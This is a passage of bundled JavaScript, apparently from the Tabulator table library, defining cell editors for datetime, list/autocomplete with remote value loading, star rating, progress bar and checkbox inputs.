    if (DT) {
      if (DT.isDateTime(cellValue)) {
        newDatetime = cellValue;
      } else if (inputFormat === "iso") {
        newDatetime = DT.fromISO(String(cellValue));
      } else {
        newDatetime = DT.fromFormat(String(cellValue), inputFormat);
      }
      cellValue = newDatetime.toFormat("yyyy-MM-dd") + "T" + newDatetime.toFormat("HH:mm");
    } else {
      console.error("Editor Error - 'date' editor 'format' param is dependant on luxon.js");
    }
  }
  input2.value = cellValue;
  onRendered(function() {
    if (cell.getType() === "cell") {
      input2.focus({ preventScroll: true });
      input2.style.height = "100%";
      if (editorParams.selectContents) {
        input2.select();
      }
    }
  });
  function onChange() {
    var value = input2.value, luxDateTime;
    if ((cellValue === null || typeof cellValue === "undefined") && value !== "" || value !== cellValue) {
      if (value && inputFormat) {
        luxDateTime = DT.fromISO(String(value));
        switch (inputFormat) {
          case true:
            value = luxDateTime;
            break;
          case "iso":
            value = luxDateTime.toISO();
            break;
          default:
            value = luxDateTime.toFormat(inputFormat);
        }
      }
      if (success(value)) {
        cellValue = input2.value;
      }
    } else {
      cancel2();
    }
  }
  input2.addEventListener("blur", function(e2) {
    if (e2.relatedTarget || e2.rangeParent || e2.explicitOriginalTarget !== input2) {
      onChange();
    }
  });
  input2.addEventListener("keydown", function(e2) {
    switch (e2.keyCode) {
      case 13:
        onChange();
        break;
      case 27:
        cancel2();
        break;
      case 35:
      case 36:
        e2.stopPropagation();
        break;
      case 38:
      case 40:
        if (vertNav == "editor") {
          e2.stopImmediatePropagation();
          e2.stopPropagation();
        }
        break;
    }
  });
  return input2;
}
let Edit$1 = class Edit {
  constructor(editor, cell, onRendered, success, cancel2, editorParams) {
    this.edit = editor;
    this.table = editor.table;
    this.cell = cell;
    this.params = this._initializeParams(editorParams);
    this.data = [];
    this.displayItems = [];
    this.currentItems = [];
    this.focusedItem = null;
    this.input = this._createInputElement();
    this.listEl = this._createListElement();
    this.initialValues = null;
    this.isFilter = cell.getType() === "header";
    this.filterTimeout = null;
    this.filtered = false;
    this.typing = false;
    this.values = [];
    this.popup = null;
    this.listIteration = 0;
    this.lastAction = "";
    this.filterTerm = "";
    this.blurable = true;
    this.actions = {
      success,
      cancel: cancel2
    };
    this._deprecatedOptionsCheck();
    this._initializeValue();
    onRendered(this._onRendered.bind(this));
  }
  _deprecatedOptionsCheck() {
  }
  _initializeValue() {
    var initialValue = this.cell.getValue();
    if (typeof initialValue === "undefined" && typeof this.params.defaultValue !== "undefined") {
      initialValue = this.params.defaultValue;
    }
    this.initialValues = this.params.multiselect ? initialValue : [initialValue];
    if (this.isFilter) {
      this.input.value = this.initialValues ? this.initialValues.join(",") : "";
      this.headerFilterInitialListGen();
    }
  }
  _onRendered() {
    var cellEl = this.cell.getElement();
    function clickStop(e2) {
      e2.stopPropagation();
    }
    if (!this.isFilter) {
      this.input.style.height = "100%";
      this.input.focus({ preventScroll: true });
    }
    cellEl.addEventListener("click", clickStop);
    setTimeout(() => {
      cellEl.removeEventListener("click", clickStop);
    }, 1e3);
    this.input.addEventListener("mousedown", this._preventPopupBlur.bind(this));
  }
  _createListElement() {
    var listEl = document.createElement("div");
    listEl.classList.add("tabulator-edit-list");
    listEl.addEventListener("mousedown", this._preventBlur.bind(this));
    listEl.addEventListener("keydown", this._inputKeyDown.bind(this));
    return listEl;
  }
  _setListWidth() {
    var element = this.isFilter ? this.input : this.cell.getElement();
    this.listEl.style.minWidth = element.offsetWidth + "px";
    if (this.params.maxWidth) {
      if (this.params.maxWidth === true) {
        this.listEl.style.maxWidth = element.offsetWidth + "px";
      } else if (typeof this.params.maxWidth === "number") {
        this.listEl.style.maxWidth = this.params.maxWidth + "px";
      } else {
        this.listEl.style.maxWidth = this.params.maxWidth;
      }
    }
  }
  _createInputElement() {
    var attribs = this.params.elementAttributes;
    var input2 = document.createElement("input");
    input2.setAttribute("type", this.params.clearable ? "search" : "text");
    input2.style.padding = "4px";
    input2.style.width = "100%";
    input2.style.boxSizing = "border-box";
    if (!this.params.autocomplete) {
      input2.style.cursor = "default";
      input2.style.caretColor = "transparent";
    }
    if (attribs && typeof attribs == "object") {
      for (let key in attribs) {
        if (key.charAt(0) == "+") {
          key = key.slice(1);
          input2.setAttribute(key, input2.getAttribute(key) + attribs["+" + key]);
        } else {
          input2.setAttribute(key, attribs[key]);
        }
      }
    }
    if (this.params.mask) {
      maskInput(input2, this.params);
    }
    this._bindInputEvents(input2);
    return input2;
  }
  _initializeParams(params) {
    var valueKeys = ["values", "valuesURL", "valuesLookup"], valueCheck;
    params = Object.assign({}, params);
    params.verticalNavigation = params.verticalNavigation || "editor";
    params.placeholderLoading = typeof params.placeholderLoading === "undefined" ? "Searching ..." : params.placeholderLoading;
    params.placeholderEmpty = typeof params.placeholderEmpty === "undefined" ? "No Results Found" : params.placeholderEmpty;
    params.filterDelay = typeof params.filterDelay === "undefined" ? 300 : params.filterDelay;
    params.emptyValue = Object.keys(params).includes("emptyValue") ? params.emptyValue : "";
    valueCheck = Object.keys(params).filter((key) => valueKeys.includes(key)).length;
    if (!valueCheck) {
      console.warn("list editor config error - either the values, valuesURL, or valuesLookup option must be set");
    } else if (valueCheck > 1) {
      console.warn("list editor config error - only one of the values, valuesURL, or valuesLookup options can be set on the same editor");
    }
    if (params.autocomplete) {
      if (params.multiselect) {
        params.multiselect = false;
        console.warn("list editor config error - multiselect option is not available when autocomplete is enabled");
      }
    } else {
      if (params.freetext) {
        params.freetext = false;
        console.warn("list editor config error - freetext option is only available when autocomplete is enabled");
      }
      if (params.filterFunc) {
        params.filterFunc = false;
        console.warn("list editor config error - filterFunc option is only available when autocomplete is enabled");
      }
      if (params.filterRemote) {
        params.filterRemote = false;
        console.warn("list editor config error - filterRemote option is only available when autocomplete is enabled");
      }
      if (params.mask) {
        params.mask = false;
        console.warn("list editor config error - mask option is only available when autocomplete is enabled");
      }
      if (params.allowEmpty) {
        params.allowEmpty = false;
        console.warn("list editor config error - allowEmpty option is only available when autocomplete is enabled");
      }
      if (params.listOnEmpty) {
        params.listOnEmpty = false;
        console.warn("list editor config error - listOnEmpty option is only available when autocomplete is enabled");
      }
    }
    if (params.filterRemote && !(typeof params.valuesLookup === "function" || params.valuesURL)) {
      params.filterRemote = false;
      console.warn("list editor config error - filterRemote option should only be used when values list is populated from a remote source");
    }
    return params;
  }
  //////////////////////////////////////
  ////////// Event Handling ////////////
  //////////////////////////////////////
  _bindInputEvents(input2) {
    input2.addEventListener("focus", this._inputFocus.bind(this));
    input2.addEventListener("click", this._inputClick.bind(this));
    input2.addEventListener("blur", this._inputBlur.bind(this));
    input2.addEventListener("keydown", this._inputKeyDown.bind(this));
    input2.addEventListener("search", this._inputSearch.bind(this));
    if (this.params.autocomplete) {
      input2.addEventListener("keyup", this._inputKeyUp.bind(this));
    }
  }
  _inputFocus(e2) {
    this.rebuildOptionsList();
  }
  _filter() {
    if (this.params.filterRemote) {
      clearTimeout(this.filterTimeout);
      this.filterTimeout = setTimeout(() => {
        this.rebuildOptionsList();
      }, this.params.filterDelay);
    } else {
      this._filterList();
    }
  }
  _inputClick(e2) {
    e2.stopPropagation();
  }
  _inputBlur(e2) {
    if (this.blurable) {
      if (this.popup) {
        this.popup.hide();
      } else {
        this._resolveValue(true);
      }
    }
  }
  _inputSearch() {
    this._clearChoices();
  }
  _inputKeyDown(e2) {
    switch (e2.keyCode) {
      case 38:
        this._keyUp(e2);
        break;
      case 40:
        this._keyDown(e2);
        break;
      case 37:
      case 39:
        this._keySide(e2);
        break;
      case 13:
        this._keyEnter();
        break;
      case 27:
        this._keyEsc();
        break;
      case 36:
      case 35:
        this._keyHomeEnd(e2);
        break;
      case 9:
        this._keyTab(e2);
        break;
      default:
        this._keySelectLetter(e2);
    }
  }
  _inputKeyUp(e2) {
    switch (e2.keyCode) {
      case 38:
      case 37:
      case 39:
      case 40:
      case 13:
      case 27:
        break;
      default:
        this._keyAutoCompLetter(e2);
    }
  }
  _preventPopupBlur() {
    if (this.popup) {
      this.popup.blockHide();
    }
    setTimeout(() => {
      if (this.popup) {
        this.popup.restoreHide();
      }
    }, 10);
  }
  _preventBlur() {
    this.blurable = false;
    setTimeout(() => {
      this.blurable = true;
    }, 10);
  }
  //////////////////////////////////////
  //////// Keyboard Navigation /////////
  //////////////////////////////////////
  _keyTab(e2) {
    if (this.params.autocomplete && this.lastAction === "typing") {
      this._resolveValue(true);
    } else {
      if (this.focusedItem) {
        this._chooseItem(this.focusedItem, true);
      }
    }
  }
  _keyUp(e2) {
    var index = this.displayItems.indexOf(this.focusedItem);
    if (this.params.verticalNavigation == "editor" || this.params.verticalNavigation == "hybrid" && index) {
      e2.stopImmediatePropagation();
      e2.stopPropagation();
      e2.preventDefault();
      if (index > 0) {
        this._focusItem(this.displayItems[index - 1]);
      }
    }
  }
  _keyDown(e2) {
    var index = this.displayItems.indexOf(this.focusedItem);
    if (this.params.verticalNavigation == "editor" || this.params.verticalNavigation == "hybrid" && index < this.displayItems.length - 1) {
      e2.stopImmediatePropagation();
      e2.stopPropagation();
      e2.preventDefault();
      if (index < this.displayItems.length - 1) {
        if (index == -1) {
          this._focusItem(this.displayItems[0]);
        } else {
          this._focusItem(this.displayItems[index + 1]);
        }
      }
    }
  }
  _keySide(e2) {
    if (!this.params.autocomplete) {
      e2.stopImmediatePropagation();
      e2.stopPropagation();
      e2.preventDefault();
    }
  }
  _keyEnter(e2) {
    if (this.params.autocomplete && this.lastAction === "typing") {
      this._resolveValue(true);
    } else {
      if (this.focusedItem) {
        this._chooseItem(this.focusedItem);
      }
    }
  }
  _keyEsc(e2) {
    this._cancel();
  }
  _keyHomeEnd(e2) {
    if (this.params.autocomplete) {
      e2.stopImmediatePropagation();
    }
  }
  _keySelectLetter(e2) {
    if (!this.params.autocomplete) {
      e2.preventDefault();
      if (e2.keyCode >= 38 && e2.keyCode <= 90) {
        this._scrollToValue(e2.keyCode);
      }
    }
  }
  _keyAutoCompLetter(e2) {
    this._filter();
    this.lastAction = "typing";
    this.typing = true;
  }
  _scrollToValue(char) {
    clearTimeout(this.filterTimeout);
    var character = String.fromCharCode(char).toLowerCase();
    this.filterTerm += character.toLowerCase();
    var match2 = this.displayItems.find((item) => {
      return typeof item.label !== "undefined" && item.label.toLowerCase().startsWith(this.filterTerm);
    });
    if (match2) {
      this._focusItem(match2);
    }
    this.filterTimeout = setTimeout(() => {
      this.filterTerm = "";
    }, 800);
  }
  _focusItem(item) {
    this.lastAction = "focus";
    if (this.focusedItem && this.focusedItem.element) {
      this.focusedItem.element.classList.remove("focused");
    }
    this.focusedItem = item;
    if (item && item.element) {
      item.element.classList.add("focused");
      item.element.scrollIntoView({ behavior: "smooth", block: "nearest", inline: "start" });
    }
  }
  //////////////////////////////////////
  /////// Data List Generation /////////
  //////////////////////////////////////
  headerFilterInitialListGen() {
    this._generateOptions(true);
  }
  rebuildOptionsList() {
    this._generateOptions().then(this._sortOptions.bind(this)).then(this._buildList.bind(this)).then(this._showList.bind(this)).catch((e2) => {
      if (!Number.isInteger(e2)) {
        console.error("List generation error", e2);
      }
    });
  }
  _filterList() {
    this._buildList(this._filterOptions());
    this._showList();
  }
  _generateOptions(silent) {
    var values = [];
    var iteration = ++this.listIteration;
    this.filtered = false;
    if (this.params.values) {
      values = this.params.values;
    } else if (this.params.valuesURL) {
      values = this._ajaxRequest(this.params.valuesURL, this.input.value);
    } else {
      if (typeof this.params.valuesLookup === "function") {
        values = this.params.valuesLookup(this.cell, this.input.value);
      } else if (this.params.valuesLookup) {
        values = this._uniqueColumnValues(this.params.valuesLookupField);
      }
    }
    if (values instanceof Promise) {
      if (!silent) {
        this._addPlaceholder(this.params.placeholderLoading);
      }
      return values.then().then((responseValues) => {
        if (this.listIteration === iteration) {
          return this._parseList(responseValues);
        } else {
          return Promise.reject(iteration);
        }
      });
    } else {
      return Promise.resolve(this._parseList(values));
    }
  }
  _addPlaceholder(contents) {
    var placeholder = document.createElement("div");
    if (typeof contents === "function") {
      contents = contents(this.cell.getComponent(), this.listEl);
    }
    if (contents) {
      this._clearList();
      if (contents instanceof HTMLElement) {
        placeholder = contents;
      } else {
        placeholder.classList.add("tabulator-edit-list-placeholder");
        placeholder.innerHTML = contents;
      }
      this.listEl.appendChild(placeholder);
      this._showList();
    }
  }
  _ajaxRequest(url, term) {
    var params = this.params.filterRemote ? { term } : {};
    url = urlBuilder(url, {}, params);
    return fetch(url).then((response) => {
      if (response.ok) {
        return response.json().catch((error2) => {
          console.warn("List Ajax Load Error - Invalid JSON returned", error2);
          return Promise.reject(error2);
        });
      } else {
        console.error("List Ajax Load Error - Connection Error: " + response.status, response.statusText);
        return Promise.reject(response);
      }
    }).catch((error2) => {
      console.error("List Ajax Load Error - Connection Error: ", error2);
      return Promise.reject(error2);
    });
  }
  _uniqueColumnValues(field) {
    var output = {}, data = this.table.getData(this.params.valuesLookup), column;
    if (field) {
      column = this.table.columnManager.getColumnByField(field);
    } else {
      column = this.cell.getColumn()._getSelf();
    }
    if (column) {
      data.forEach((row) => {
        var val = column.getFieldValue(row);
        if (!this._emptyValueCheck(val)) {
          if (this.params.multiselect && Array.isArray(val)) {
            val.forEach((item) => {
              if (!this._emptyValueCheck(item)) {
                output[item] = true;
              }
            });
          } else {
            output[val] = true;
          }
        }
      });
    } else {
      console.warn("unable to find matching column to create select lookup list:", field);
      output = [];
    }
    return Object.keys(output);
  }
  _emptyValueCheck(value) {
    return value === null || typeof value === "undefined" || value === "";
  }
  _parseList(inputValues) {
    var data = [];
    if (!Array.isArray(inputValues)) {
      inputValues = Object.entries(inputValues).map(([key, value]) => {
        return {
          label: value,
          value: key
        };
      });
    }
    inputValues.forEach((value) => {
      if (typeof value !== "object") {
        value = {
          label: value,
          value
        };
      }
      this._parseListItem(value, data, 0);
    });
    if (!this.currentItems.length && this.params.freetext) {
      this.input.value = this.initialValues;
      this.typing = true;
      this.lastAction = "typing";
    }
    this.data = data;
    return data;
  }
  _parseListItem(option, data, level) {
    var item = {};
    if (option.options) {
      item = this._parseListGroup(option, level + 1);
    } else {
      item = {
        label: option.label,
        value: option.value,
        itemParams: option.itemParams,
        elementAttributes: option.elementAttributes,
        element: false,
        selected: false,
        visible: true,
        level,
        original: option
      };
      if (this.initialValues && this.initialValues.indexOf(option.value) > -1) {
        this._chooseItem(item, true);
      }
    }
    data.push(item);
  }
  _parseListGroup(option, level) {
    var item = {
      label: option.label,
      group: true,
      itemParams: option.itemParams,
      elementAttributes: option.elementAttributes,
      element: false,
      visible: true,
      level,
      options: [],
      original: option
    };
    option.options.forEach((child) => {
      this._parseListItem(child, item.options, level);
    });
    return item;
  }
  _sortOptions(options) {
    var sorter;
    if (this.params.sort) {
      sorter = typeof this.params.sort === "function" ? this.params.sort : this._defaultSortFunction.bind(this);
      this._sortGroup(sorter, options);
    }
    return options;
  }
  _sortGroup(sorter, options) {
    options.sort((a, b) => {
      return sorter(a.label, b.label, a.value, b.value, a.original, b.original);
    });
    options.forEach((option) => {
      if (option.group) {
        this._sortGroup(sorter, option.options);
      }
    });
  }
  _defaultSortFunction(as, bs) {
    var a, b, a1, b1, i2 = 0, L, rx = /(\d+)|(\D+)/g, rd = /\d/;
    var emptyAlign = 0;
    if (this.params.sort === "desc") {
      [as, bs] = [bs, as];
    }
    if (!as && as !== 0) {
      emptyAlign = !bs && bs !== 0 ? 0 : -1;
    } else if (!bs && bs !== 0) {
      emptyAlign = 1;
    } else {
      if (isFinite(as) && isFinite(bs)) return as - bs;
      a = String(as).toLowerCase();
      b = String(bs).toLowerCase();
      if (a === b) return 0;
      if (!(rd.test(a) && rd.test(b))) return a > b ? 1 : -1;
      a = a.match(rx);
      b = b.match(rx);
      L = a.length > b.length ? b.length : a.length;
      while (i2 < L) {
        a1 = a[i2];
        b1 = b[i2++];
        if (a1 !== b1) {
          if (isFinite(a1) && isFinite(b1)) {
            if (a1.charAt(0) === "0") a1 = "." + a1;
            if (b1.charAt(0) === "0") b1 = "." + b1;
            return a1 - b1;
          } else return a1 > b1 ? 1 : -1;
        }
      }
      return a.length > b.length;
    }
    return emptyAlign;
  }
  _filterOptions() {
    var filterFunc = this.params.filterFunc || this._defaultFilterFunc, term = this.input.value;
    if (term) {
      this.filtered = true;
      this.data.forEach((item) => {
        this._filterItem(filterFunc, term, item);
      });
    } else {
      this.filtered = false;
    }
    return this.data;
  }
  _filterItem(func, term, item) {
    var matches = false;
    if (!item.group) {
      item.visible = func(term, item.label, item.value, item.original);
    } else {
      item.options.forEach((option) => {
        if (this._filterItem(func, term, option)) {
          matches = true;
        }
      });
      item.visible = matches;
    }
    return item.visible;
  }
  _defaultFilterFunc(term, label, value, item) {
    term = String(term).toLowerCase();
    if (label !== null && typeof label !== "undefined") {
      if (String(label).toLowerCase().indexOf(term) > -1 || String(value).toLowerCase().indexOf(term) > -1) {
        return true;
      }
    }
    return false;
  }
  //////////////////////////////////////
  /////////// Display List /////////////
  //////////////////////////////////////
  _clearList() {
    while (this.listEl.firstChild) this.listEl.removeChild(this.listEl.firstChild);
    this.displayItems = [];
  }
  _buildList(data) {
    this._clearList();
    data.forEach((option) => {
      this._buildItem(option);
    });
    if (!this.displayItems.length) {
      this._addPlaceholder(this.params.placeholderEmpty);
    }
  }
  _buildItem(item) {
    var el = item.element, contents;
    if (!this.filtered || item.visible) {
      if (!el) {
        el = document.createElement("div");
        el.tabIndex = 0;
        contents = this.params.itemFormatter ? this.params.itemFormatter(item.label, item.value, item.original, el) : item.label;
        if (contents instanceof HTMLElement) {
          el.appendChild(contents);
        } else {
          el.innerHTML = contents;
        }
        if (item.group) {
          el.classList.add("tabulator-edit-list-group");
        } else {
          el.classList.add("tabulator-edit-list-item");
        }
        el.classList.add("tabulator-edit-list-group-level-" + item.level);
        if (item.elementAttributes && typeof item.elementAttributes == "object") {
          for (let key in item.elementAttributes) {
            if (key.charAt(0) == "+") {
              key = key.slice(1);
              el.setAttribute(key, this.input.getAttribute(key) + item.elementAttributes["+" + key]);
            } else {
              el.setAttribute(key, item.elementAttributes[key]);
            }
          }
        }
        if (item.group) {
          el.addEventListener("click", this._groupClick.bind(this, item));
        } else {
          el.addEventListener("click", this._itemClick.bind(this, item));
        }
        el.addEventListener("mousedown", this._preventBlur.bind(this));
        item.element = el;
      }
      this._styleItem(item);
      this.listEl.appendChild(el);
      if (item.group) {
        item.options.forEach((option) => {
          this._buildItem(option);
        });
      } else {
        this.displayItems.push(item);
      }
    }
  }
  _showList() {
    var startVis = this.popup && this.popup.isVisible();
    if (this.input.parentNode) {
      if (this.params.autocomplete && this.input.value === "" && !this.params.listOnEmpty) {
        if (this.popup) {
          this.popup.hide(true);
        }
        return;
      }
      this._setListWidth();
      if (!this.popup) {
        this.popup = this.edit.popup(this.listEl);
      }
      this.popup.show(this.cell.getElement(), "bottom");
      if (!startVis) {
        setTimeout(() => {
          this.popup.hideOnBlur(this._resolveValue.bind(this, true));
        }, 10);
      }
    }
  }
  _styleItem(item) {
    if (item && item.element) {
      if (item.selected) {
        item.element.classList.add("active");
      } else {
        item.element.classList.remove("active");
      }
    }
  }
  //////////////////////////////////////
  ///////// User Interaction ///////////
  //////////////////////////////////////
  _itemClick(item, e2) {
    e2.stopPropagation();
    this._chooseItem(item);
  }
  _groupClick(item, e2) {
    e2.stopPropagation();
  }
  //////////////////////////////////////
  ////// Current Item Management ///////
  //////////////////////////////////////
  _cancel() {
    this.popup.hide(true);
    this.actions.cancel();
  }
  _clearChoices() {
    this.typing = true;
    this.currentItems.forEach((item) => {
      item.selected = false;
      this._styleItem(item);
    });
    this.currentItems = [];
    this.focusedItem = null;
  }
  _chooseItem(item, silent) {
    var index;
    this.typing = false;
    if (this.params.multiselect) {
      index = this.currentItems.indexOf(item);
      if (index > -1) {
        this.currentItems.splice(index, 1);
        item.selected = false;
      } else {
        this.currentItems.push(item);
        item.selected = true;
      }
      this.input.value = this.currentItems.map((item2) => item2.label).join(",");
      this._styleItem(item);
    } else {
      this.currentItems = [item];
      item.selected = true;
      this.input.value = item.label;
      this._styleItem(item);
      if (!silent) {
        this._resolveValue();
      }
    }
    this._focusItem(item);
  }
  _resolveValue(blur) {
    var output, initialValue;
    if (this.popup) {
      this.popup.hide(true);
    }
    if (this.params.multiselect) {
      output = this.currentItems.map((item) => item.value);
    } else {
      if (blur && this.params.autocomplete && this.typing) {
        if (this.params.freetext || this.params.allowEmpty && this.input.value === "") {
          output = this.input.value;
        } else {
          this.actions.cancel();
          return;
        }
      } else {
        if (this.currentItems[0]) {
          output = this.currentItems[0].value;
        } else {
          initialValue = Array.isArray(this.initialValues) ? this.initialValues[0] : this.initialValues;
          if (initialValue === null || typeof initialValue === "undefined" || initialValue === "") {
            output = initialValue;
          } else {
            output = this.params.emptyValue;
          }
        }
      }
    }
    if (output === "") {
      output = this.params.emptyValue;
    }
    this.actions.success(output);
    if (this.isFilter) {
      this.initialValues = output && !Array.isArray(output) ? [output] : output;
      this.currentItems = [];
    }
  }
};
function list(cell, onRendered, success, cancel2, editorParams) {
  var list2 = new Edit$1(this, cell, onRendered, success, cancel2, editorParams);
  return list2.input;
}
function star$1(cell, onRendered, success, cancel2, editorParams) {
  var self = this, element = cell.getElement(), value = cell.getValue(), maxStars = element.getElementsByTagName("svg").length || 5, size = element.getElementsByTagName("svg")[0] ? element.getElementsByTagName("svg")[0].getAttribute("width") : 14, stars = [], starsHolder = document.createElement("div"), star2 = document.createElementNS("http://www.w3.org/2000/svg", "svg");
  function starChange(val) {
    stars.forEach(function(star3, i3) {
      if (i3 < val) {
        if (self.table.browser == "ie") {
          star3.setAttribute("class", "tabulator-star-active");
        } else {
          star3.classList.replace("tabulator-star-inactive", "tabulator-star-active");
        }
        star3.innerHTML = '<polygon fill="#488CE9" stroke="#014AAE" stroke-width="37.6152" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" points="259.216,29.942 330.27,173.919 489.16,197.007 374.185,309.08 401.33,467.31 259.216,392.612 117.104,467.31 144.25,309.08 29.274,197.007 188.165,173.919 "/>';
      } else {
        if (self.table.browser == "ie") {
          star3.setAttribute("class", "tabulator-star-inactive");
        } else {
          star3.classList.replace("tabulator-star-active", "tabulator-star-inactive");
        }
        star3.innerHTML = '<polygon fill="#010155" stroke="#686868" stroke-width="37.6152" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" points="259.216,29.942 330.27,173.919 489.16,197.007 374.185,309.08 401.33,467.31 259.216,392.612 117.104,467.31 144.25,309.08 29.274,197.007 188.165,173.919 "/>';
      }
    });
  }
  function buildStar(i3) {
    var starHolder = document.createElement("span");
    var nextStar = star2.cloneNode(true);
    stars.push(nextStar);
    starHolder.addEventListener("mouseenter", function(e2) {
      e2.stopPropagation();
      e2.stopImmediatePropagation();
      starChange(i3);
    });
    starHolder.addEventListener("mousemove", function(e2) {
      e2.stopPropagation();
      e2.stopImmediatePropagation();
    });
    starHolder.addEventListener("click", function(e2) {
      e2.stopPropagation();
      e2.stopImmediatePropagation();
      success(i3);
      element.blur();
    });
    starHolder.appendChild(nextStar);
    starsHolder.appendChild(starHolder);
  }
  function changeValue(val) {
    value = val;
    starChange(val);
  }
  element.style.whiteSpace = "nowrap";
  element.style.overflow = "hidden";
  element.style.textOverflow = "ellipsis";
  starsHolder.style.verticalAlign = "middle";
  starsHolder.style.display = "inline-block";
  starsHolder.style.padding = "4px";
  star2.setAttribute("width", size);
  star2.setAttribute("height", size);
  star2.setAttribute("viewBox", "0 0 512 512");
  star2.setAttribute("xml:space", "preserve");
  star2.style.padding = "0 1px";
  if (editorParams.elementAttributes && typeof editorParams.elementAttributes == "object") {
    for (let key in editorParams.elementAttributes) {
      if (key.charAt(0) == "+") {
        key = key.slice(1);
        starsHolder.setAttribute(key, starsHolder.getAttribute(key) + editorParams.elementAttributes["+" + key]);
      } else {
        starsHolder.setAttribute(key, editorParams.elementAttributes[key]);
      }
    }
  }
  for (var i2 = 1; i2 <= maxStars; i2++) {
    buildStar(i2);
  }
  value = Math.min(parseInt(value), maxStars);
  starChange(value);
  starsHolder.addEventListener("mousemove", function(e2) {
    starChange(0);
  });
  starsHolder.addEventListener("click", function(e2) {
    success(0);
  });
  element.addEventListener("blur", function(e2) {
    cancel2();
  });
  element.addEventListener("keydown", function(e2) {
    switch (e2.keyCode) {
      case 39:
        changeValue(value + 1);
        break;
      case 37:
        changeValue(value - 1);
        break;
      case 13:
        success(value);
        break;
      case 27:
        cancel2();
        break;
    }
  });
  return starsHolder;
}
function progress$1(cell, onRendered, success, cancel2, editorParams) {
  var element = cell.getElement(), max2 = typeof editorParams.max === "undefined" ? element.getElementsByTagName("div")[0] && element.getElementsByTagName("div")[0].getAttribute("max") || 100 : editorParams.max, min2 = typeof editorParams.min === "undefined" ? element.getElementsByTagName("div")[0] && element.getElementsByTagName("div")[0].getAttribute("min") || 0 : editorParams.min, percent = (max2 - min2) / 100, value = cell.getValue() || 0, handle2 = document.createElement("div"), bar = document.createElement("div"), mouseDrag, mouseDragWidth;
  function updateValue() {
    var style = window.getComputedStyle(element, null);
    var calcVal = percent * Math.round(bar.offsetWidth / ((element.clientWidth - parseInt(style.getPropertyValue("padding-left")) - parseInt(style.getPropertyValue("padding-right"))) / 100)) + min2;
    success(calcVal);
    element.setAttribute("aria-valuenow", calcVal);
    element.setAttribute("aria-label", value);
  }
  handle2.style.position = "absolute";
  handle2.style.right = "0";
  handle2.style.top = "0";
  handle2.style.bottom = "0";
  handle2.style.width = "5px";
  handle2.classList.add("tabulator-progress-handle");
  bar.style.display = "inline-block";
  bar.style.position = "relative";
  bar.style.height = "100%";
  bar.style.backgroundColor = "#488CE9";
  bar.style.maxWidth = "100%";
  bar.style.minWidth = "0%";
  if (editorParams.elementAttributes && typeof editorParams.elementAttributes == "object") {
    for (let key in editorParams.elementAttributes) {
      if (key.charAt(0) == "+") {
        key = key.slice(1);
        bar.setAttribute(key, bar.getAttribute(key) + editorParams.elementAttributes["+" + key]);
      } else {
        bar.setAttribute(key, editorParams.elementAttributes[key]);
      }
    }
  }
  element.style.padding = "4px 4px";
  value = Math.min(parseFloat(value), max2);
  value = Math.max(parseFloat(value), min2);
  value = Math.round((value - min2) / percent);
  bar.style.width = value + "%";
  element.setAttribute("aria-valuemin", min2);
  element.setAttribute("aria-valuemax", max2);
  bar.appendChild(handle2);
  handle2.addEventListener("mousedown", function(e2) {
    mouseDrag = e2.screenX;
    mouseDragWidth = bar.offsetWidth;
  });
  handle2.addEventListener("mouseover", function() {
    handle2.style.cursor = "ew-resize";
  });
  element.addEventListener("mousemove", function(e2) {
    if (mouseDrag) {
      bar.style.width = mouseDragWidth + e2.screenX - mouseDrag + "px";
    }
  });
  element.addEventListener("mouseup", function(e2) {
    if (mouseDrag) {
      e2.stopPropagation();
      e2.stopImmediatePropagation();
      mouseDrag = false;
      mouseDragWidth = false;
      updateValue();
    }
  });
  element.addEventListener("keydown", function(e2) {
    switch (e2.keyCode) {
      case 39:
        e2.preventDefault();
        bar.style.width = bar.clientWidth + element.clientWidth / 100 + "px";
        break;
      case 37:
        e2.preventDefault();
        bar.style.width = bar.clientWidth - element.clientWidth / 100 + "px";
        break;
      case 9:
      case 13:
        updateValue();
        break;
      case 27:
        cancel2();
        break;
    }
  });
  element.addEventListener("blur", function() {
    cancel2();
  });
  return bar;
}
function tickCross$1(cell, onRendered, success, cancel2, editorParams) {
  var value = cell.getValue(), input2 = document.createElement("input"), tristate = editorParams.tristate, indetermValue = typeof editorParams.indeterminateValue === "undefined" ? null : editorParams.indeterminateValue, indetermState = false, trueValueSet = Object.keys(editorParams).includes("trueValue"), falseValueSet = Object.keys(editorParams).includes("falseValue");
  input2.setAttribute("type", "checkbox");
  input2.style.marginTop = "5px";
  input2.style.boxSizing = "border-box";
  if (editorParams.elementAttributes && typeof editorParams.elementAttributes == "object") {
    for (let key in editorParams.elementAttributes) {
      if (key.charAt(0) == "+") {
        key = key.slice(1);
        input2.setAttribute(key, input2.getAttribute(key) + editorParams.elementAttributes["+" + key]);
      } else {
        input2.setAttribute(key, editorParams.elementAttributes[key]);
      }
    }
  }
  input2.value = value;
  if (tristate && (typeof value === "undefined" || value === indetermValue || value === "")) {
    indetermState = true;
    input2.indeterminate = true;
  }
  if (this.table.browser != "firefox" && this.table.browser != "safari") {
    onRendered(function() {
      if (cell.getType() === "cell") {
        input2.focus({ preventScroll: true });
      }
    });
  }
  input2.checked = trueValueSet ? value === editorParams.trueValue : value === true || value === "true" || value === "True" || value === 1;
  function setValue(blur) {
    var checkedValue = input2.checked;
    if (trueValueSet && checkedValue) {
      checkedValue = editorParams.trueValue;
    } else if (falseValueSet && !checkedValue) {
      checkedValue = editorParams.falseValue;
    }
    if (tristate) {
      if (!blur) {
        if (input2.checked && !indetermState) {
          input2.checked = false;
          input2.indeterminate = true;
          indetermState = true;
          return indetermValue;
        } else {
          indetermState = false;
          return checkedValue;
        }
      } else {
        if (indetermState) {
          return indetermValue;
        } else {
          return checkedValue;
        }
      }
    } else {
      return checkedValue;
    }
  }
  input2.addEventListener("change", function(e2) {
    success(setValue());
  });
  input2.addEventListener("blur", function(e2) {
    success(setValue(true));
  });
  input2.addEventListener("keydown", function(e2) {
    if (e2.keyCode == 13) {
      success(setValue());
    }
    if (e2.keyCode == 27) {
      cancel2();
    }
  });
  return input2;
}
function adaptable$1(cell, onRendered, success, cancel2, params) {
  var column = cell._getSelf().column, lookup2, editorFunc, editorParams;
  function defaultLookup(cell2) {
    var value = cell2.getValue(), editor = "input";
    switch (typeof value) {
      case "number":
        editor = "number";
        break;
      case "boolean":
        editor = "tickCross";
        break;
      case "string":
        if (value.includes("\n")) {
          editor = "textarea";
        }
        break;
    }
    return editor;
  }
  lookup2 = params.editorLookup ? params.editorLookup(cell) : defaultLookup(cell);
